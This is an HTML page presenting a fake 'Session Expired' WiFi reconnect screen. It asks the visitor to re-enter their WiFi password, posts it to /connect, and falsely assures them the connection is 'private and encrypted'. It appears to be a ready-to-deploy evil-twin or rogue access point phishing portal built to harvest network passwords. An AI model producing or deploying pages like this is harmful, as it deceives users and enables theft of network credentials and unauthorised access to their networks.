<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Network Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .card {
            background: white;
            border-radius: 10px;
            padding: 40px 36px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        .icon {
            text-align: center;
            font-size: 52px;
            margin-bottom: 18px;
        }
        h2 {
            text-align: center;
            color: #1a1a1a;
            font-size: 20px;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #888;
            font-size: 13px;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #555;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1.5px solid #e0e0e0;
            border-radius: 7px;
            font-size: 15px;
            margin-bottom: 18px;
            outline: none;
            transition: border-color 0.2s;
        }
        input[type="password"]:focus {
            border-color: #0070f3;
        }
        button {
            width: 100%;
            padding: 13px;
            background: #0070f3;
            color: white;
            border: none;
            border-radius: 7px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover { background: #005dd1; }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: #bbb;
        }
        .lock { margin-right: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📶</div>
        <h2>Session Expired</h2>
        <p class="subtitle">Your connection was interrupted.<br>Re-enter your WiFi password to reconnect.</p>
        <form method="POST" action="/connect">
            <label>WiFi Password</label>
            <input type="password" name="password" placeholder="••••••••••••" autofocus required>
            <button type="submit">🔒 &nbsp;Reconnect</button>
        </form>
        <div class="footer">Your connection is private and encrypted</div>
    </div>
</body>
</html>
